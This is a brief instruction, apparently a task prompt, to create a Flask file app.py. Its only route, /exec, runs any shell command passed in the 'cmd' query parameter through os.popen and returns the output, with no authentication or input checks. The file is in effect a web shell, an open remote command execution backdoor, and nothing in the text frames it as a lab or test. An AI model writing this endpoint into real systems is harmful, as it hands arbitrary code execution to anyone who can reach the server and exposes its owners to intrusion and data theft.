Create /workspace/app.py with content:
from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()
